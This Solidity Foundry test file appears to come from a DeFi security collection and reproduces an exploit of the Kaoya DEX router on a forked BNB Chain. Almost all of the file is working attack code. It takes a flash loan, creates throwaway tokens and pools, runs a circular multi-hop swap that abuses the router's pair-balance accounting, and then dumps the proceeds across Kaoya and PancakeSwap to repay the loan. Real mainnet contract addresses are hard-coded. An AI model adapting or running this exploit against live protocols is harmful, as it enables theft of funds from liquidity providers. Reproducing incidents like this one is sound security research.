// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../interface.sol";
import "src/defisec/Log.sol";
/*

*/
// forge test --contracts ./src/defisec/dex/Kaoya_exp.sol -vv  (vv只打印log不打印trace)
interface IDPP{
    function flashLoan(uint baseAmouont, uint quoteAmount, address assetTo, bytes calldata data) external;
}
interface KAOYA_ROUTER is Uni_Router_V2{
    function getTokenInPair(address pair,address token) external view returns (uint);
}
contract ContractTest is Test, MyLog{
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));//因为它有payable的fallback
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 KY = IERC20(0xa8a33e365D5a03c94C3258A10Dd5d6dfE686941B);

    KAOYA_ROUTER kaoya_router = KAOYA_ROUTER(0x879EAD67C92ec2bFa70fa9d157F500B7b31b64AB);
    Uni_Router_V2 pancake_router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    //
    IDPP dpp = IDPP(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    address factory = 0xbFB0A989e12D49A0a3874770B1C1CdDF0d9162aA;

    Uni_Pair_V2 pair1;
    Uni_Pair_V2 pair2;
    Uni_Pair_V2 pair3;


    function setUp() public {
        vm.createSelectFork("bsc",20705000-1);

        vm.label(address(WBNB), 'WBNB');
        vm.label(address(BUSD), 'BUSD');
        vm.label(address(KY), 'KY');
//        vm.label(address(TA), 'TA');
//        vm.label(address(TB), 'TB');


    }
    SimpleToken TA ;
    SimpleToken TB ;
    function testExploit() public {
        vm.deal(address(this),1e18);
//        console.log('111111111111111111111');
        TA = new SimpleToken('TA'   , 'TA');
        TB = new SimpleToken('TB'   , 'TB');
        vm.label(address(TA), 'TA');
        vm.label(address(TB), 'TB');
        TA.mint(10000e18);
        TB.mint(100e18);
//        console.log('2222222222222222222222');
        //
//        bytes calldata data=0x00000000000000000000000000000000000000000000006194049f30f720000000000000000000000000000074ef69defe8bae1fe660fb93265fc1bc79c9bda8000000000000000000000000d84379c4eea25d05574f9f0b99e3bf73500ca4b4000000000000000000000000000000000000000000000024791d4a4cc29100000000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000000000000000000000000037a13f40032a1b0000;
        dpp.flashLoan(1800e18, 0, address(this), new bytes(1));
        finalInterest();
    }

    function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
//        console.log('23232232323232323232');
        (address token0, address token1) = sortTokens(address(WBNB), address(TA));
        pair1  = Uni_Pair_V2(pairFor(factory, token0, token1));
        (token0, token1) = sortTokens(address(WBNB), address(TB));
        pair2  = Uni_Pair_V2(pairFor(factory, token0, token1));
        (token0, token1)  = sortTokens(address(TB), address(TA));
        pair3  = Uni_Pair_V2(pairFor(factory, token0, token1));

        emit log_named_decimal_uint("mybalance WBNB" , WBNB.balanceOf(address(this)), WBNB.decimals());
        WBNB.approve(address(kaoya_router), type(uint256).max);//
//        console.log('333333333333333333333');
        address[] memory  path = new address[](2);
        path[0]=address(WBNB);
        path[1]=address(KY);
//        console.log('4444444444444444444444');
        logTokens('bfore swap (WBNB, KY)');
        kaoya_router.swapExactTokensForTokens(672.8e18, 1e18, path, address(this), block.timestamp+1000);
//        console.log('5555555555555555555');
        address[] memory  path2 = new address[](2);
        path2[0] = address(WBNB);
        path2[1] = address(BUSD);
        logTokens('bfore swap (WBNB, BUSD)');
        kaoya_router.swapExactTokensForTokens(100e18, 1e18, path2, address(this), block.timestamp+1000);
//        console.log('666666666666666666666');

        TA.approve(address(kaoya_router), type(uint256).max);
        TB.approve(address(kaoya_router), type(uint256).max);
        logTokens('bfore addLiquidity (WBNB, TA)');
        (, , uint256 liquidity1) = kaoya_router.addLiquidity(address(WBNB), address(TA), 1026.19e18, 50e18, 380, 40, address(this), block.timestamp+1000);
        logTokens('bfore addLiquidity (WBNB, TB)');
        (, , uint256 liquidity2) = kaoya_router.addLiquidity(address(WBNB), address(TB), 1e18, 1e18, 1, 1, address(this), block.timestamp+1000);
//        console.log('777777777777777777777');
        logTokens('bfore addLiquidity (TA, TB)');
        (, , uint256 liquidity3) = kaoya_router.addLiquidity(address(TA), address(TB), 1e18, 1e18, 1, 1, address(this), block.timestamp+1000);
//        console.log('888888888888888888888');

        /*
        address lastPair = UniswapV2Library.pairFor(factory, path[path.length - 2], path[path.length - 1]);
         uint balanceBefore = getTokenInPair(lastPair,WETH);
         ..swap()
         uint balanceAfter = getTokenInPair(lastPair,WETH);
        uint amountOut = balanceBefore.sub(balanceAfter);
        swap前后最后一个池子发过来的金额的差值。最后一个池子=第一个池子。
        );
        */
        address[] memory path3 = new address[](5);
        path3[0] = address(TA);
        path3[1] = address(WBNB);
        path3[2] = address(TB);
        path3[3] = address(TA);
        path3[4] = address(WBNB);
        //这里溢出了，下次有个估算成本的概念。
        // 接受eth需要fallback
        logTokens('bfore SWAP (TA, WBNB,TB,TA,WBNB)');
        kaoya_router.swapExactTokensForETHSupportingFeeOnTransferTokens(8000e18, 1, path3, address(this), block.timestamp+1000);
//        console.log('aaaaaaaaaaaaaaa');
        //排序就是为了唯一，链下计算。
        logTokens('bfore removeLiquidity (TA, WBNB)');
        removeLiquidity(address(WBNB), address(TA), liquidity1, true);
//        console.log('aaaaaaaaaaaaaaa111111111');
        logTokens('bfore removeLiquidity (TB, WBNB)');
        removeLiquidity(address(WBNB), address(TB), liquidity2, true);
//        console.log('aaaaaaaaaaaaaaa222222222');
        logTokens('bfore removeLiquidity (TB, TA)');
        removeLiquidity(address(TB), address(TA), liquidity3, false);
//        console.log('bbbbbbbbbbbbbbbbbbbbbb');
        logTokens('bfore WBNB.deposit ()');
        WBNB.deposit{value:address(this).balance}();
//        console.log('cccccccccccccccccccccc');
        //KY 换BUSD
        KY.approve(address(kaoya_router), type(uint256).max);
        KY.approve(address(pancake_router), type(uint256).max);
        address[] memory  path4 = new address[](2);
        path4[0]=address(KY);
        path4[1]=address(BUSD);
        logTokens('bfore SWAP  (KY,BUSD)');
        kaoya_router.swapExactTokensForTokens(83_918e18, 1e18, path4, address(this), block.timestamp+1000);
//        console.log('ddddddddddddddddddddddddddd');
        logTokens('bfore SWAP  (KY,BUSD)');
        pancake_router.swapExactTokensForTokens(17_740e18, 1e18, path4, address(this), block.timestamp+1000);
//        console.log('eeeeeeeeeeeeeeeeeeeeeeeeeeee');
        address[] memory  path5 = new address[](2);
        path5[0]=address(KY);
        path5[1]=address(WBNB);
        logTokens('bfore SWAP  (KY,WBNB)');
        pancake_router.swapExactTokensForTokens(23_364e18, 1e18, path5, address(this), block.timestamp+1000);
//        console.log('ffffffffffffffffffffffffff');
        WBNB.transfer(address(dpp), 1800e18);

//        log
        finalInterest();
    }

    function finalInterest() public {
        console.log('finalInterest');
        emit log_named_decimal_uint("mybalance WBNB" , WBNB.balanceOf(address(this)), WBNB.decimals());
        emit log_named_decimal_uint("mybalance BUSD" , BUSD.balanceOf(address(this)), BUSD.decimals());
        emit log_named_decimal_uint("mybalance KY" , KY.balanceOf(address(this)), KY.decimals());
    }
    //打印，三个pair的余额和router的余
    function removeLiquidity(address token0, address token1, uint liquidity, bool containETH) public {
        (address token0, address token1) = sortTokens(token0, token1);
        Uni_Pair_V2 pair = Uni_Pair_V2(pairFor(factory, token0, token1));
        pair.approve(address(kaoya_router), type(uint256).max);
        console.log('liquidity', liquidity);
        //
        if(containETH){
            kaoya_router.removeLiquidityETHSupportingFeeOnTransferTokens(token0, liquidity, 1, 1, address(this), block.timestamp+1000);
        }else{
            kaoya_router.removeLiquidity(token0, token1, liquidity, 1, 1, address(this), block.timestamp+1000);
        }
    }

    fallback() external payable {
        console.log('fallback');
    }

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
//         Explicit type conversion not allowed from "uint256" to "address".
        pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'e6d6d0a3b71886f20325ef74a341f4805b42c4e8e6666b6d5d55ae47741e3e78' // init code hash
        )))));
    }
    function pairFor_pancake(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        address factory=0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;//pancakeFactory
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
        )))));
    }

    uint i = 1;

    function logTokens(string memory key) public{
        console.log(string(abi.encodePacked(key, "-----------------------------")), i++);

        // 总额部分
        log_named_decimal_uint1("mybalance", "WBNB" , WBNB.balanceOf(address(this)), WBNB.decimals());
        log_named_decimal_uint1("mybalance", "BUSD",  BUSD.balanceOf(address(this)), BUSD.decimals());
        log_named_decimal_uint1("mybalance","KY  " , KY.balanceOf(address(this)), KY.decimals());
//        log_named_decimal_uint1("mybalance","TA  " , TA.balanceOf(address(this)), TA.decimals());
//        log_named_decimal_uint1("mybalance","TB  " , TB.balanceOf(address(this)), TB.decimals());

        log_named_decimal_uint1("router", "WBNB" , WBNB.balanceOf(address(kaoya_router)), WBNB.decimals());
        log_named_decimal_uint1("router", "BUSD",  BUSD.balanceOf(address(kaoya_router)), BUSD.decimals());
        log_named_decimal_uint1("router","KY  " , KY.balanceOf(address(kaoya_router)), KY.decimals());
//        log_named_decimal_uint1("router","TA  " , TA.balanceOf(address(kaoya_router)), TA.decimals());
//        log_named_decimal_uint1("router","TB  " , TB.balanceOf(address(kaoya_router)), TB.decimals());

        // 价格部分
        log_route_price(address(pair1),'pair1', "TA  ", "WBNB", address(TA), address(WBNB));
        log_route_price(address(pair2),'pair2', "TB  ", "WBNB", address(TB), address(WBNB));
        log_route_price(address(pair3),'pair3', "TA  ", "TB", address(TA), address(TB));

        {
            (address token0, address token1) = sortTokens(address(WBNB), address(KY));
            Uni_Pair_V2 pair  = Uni_Pair_V2(pairFor(factory, token0, token1));
            log_route_price(address(pair),'kaoyaPair(KY-WBNB)', "KY  ", "WBNB", address(KY), address(WBNB));
        }
        {
            (address token0, address token1) = sortTokens(address(WBNB), address(BUSD));
            Uni_Pair_V2 pair  = Uni_Pair_V2(pairFor(factory, token0, token1));
            log_route_price(address(pair),'kaoyaPair(BUSD-WBNB)',"BUSD", "WBNB", address(BUSD),  address(WBNB));
        }
        {
            (address token0, address token1) = sortTokens(address(KY), address(BUSD));
            Uni_Pair_V2 pair  = Uni_Pair_V2(pairFor(factory, token0, token1));
            log_route_price(address(pair),'kaoyaPair(BUSD-KY)',"KY  ", "BUSD",  address(KY), address(BUSD));
        }

        {
            (address token0, address token1) = sortTokens(address(WBNB), address(KY));
            Uni_Pair_V2 pair  = Uni_Pair_V2(pairFor_pancake(factory, token0, token1));
            log_pair_price(address(pair),'pancakePair(KY-WBNB)', "KY  ", "WBNB", address(KY), address(WBNB));
        }
        {
            (address token0, address token1) = sortTokens(address(KY), address(BUSD));
            Uni_Pair_V2 pair  = Uni_Pair_V2(pairFor_pancake(factory, token0, token1));
            log_pair_price(address(pair),'pancakePair(KY-BUSD)',"KY  ", "BUSD",  address(KY), address(BUSD));
        }

        console.log('-----------------------------');


    }
    //打印Price是为了一眼看出两个池子是否有套利空间。 Price和定错误日志，先打印全了，再注释没有的。
    function log_pair_price(address pair,string memory pairName,string memory t1name, string memory t2name, address token1, address token2 ) public returns(uint){
        IERC20 t1 = IERC20(token1);
        IERC20 t2 = IERC20(token2);
        uint t1_balance = t1.balanceOf(pair);
        uint t2_balance = t2.balanceOf(pair);
        log_named_decimal_uint1(pairName, t1name, t1_balance, t1.decimals());
        log_named_decimal_uint1(pairName,t2name, t2_balance, t2.decimals());
        if(t2_balance == 0) {
            console.log('log_pair_price        t2_balance=0         ');
            return 0;
        } else {
            //
            log_named_decimal_uint1(pairName, "price", t1_balance/t2_balance, t1.decimals()-t2.decimals());
            return  t1_balance/t2_balance;
        }
    }

    function log_route_price(address pair,string memory routerName,string memory t1name, string memory t2name, address token1, address token2 ) public returns(uint){
        IERC20 t1 = IERC20(token1);
        IERC20 t2 = IERC20(token2);
        uint t1_balance = kaoya_router.getTokenInPair(address(pair), address(token1));
        uint t2_balance = kaoya_router.getTokenInPair(address(pair), address(token2));

        log_named_decimal_uint1(routerName, t1name, t1_balance, 0);
        log_named_decimal_uint1(routerName,t2name, t2_balance, 0);

        if(t2_balance == 0) {
            console.log('log_route_price        t2_balance=0         ');
            return 0;
        } else {
            //
            log_named_decimal_uint1(routerName, "price", t1_balance/t2_balance, t1.decimals()-t2.decimals());
            return  t1_balance/t2_balance;
        }
    }

}
contract SimpleToken {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name  ;
    string public symbol ;
    uint8 public decimals = 18;

    constructor(string memory name, string memory symbol) {
        name = name;
        symbol = symbol;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
//        console.log('transferFrom');
//        console.log('allowance[sender][msg.sender]', allowance[sender][msg.sender]);
//        console.log('balanceOf[sender]', balanceOf[sender]);
//        console.log('amount', amount);
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}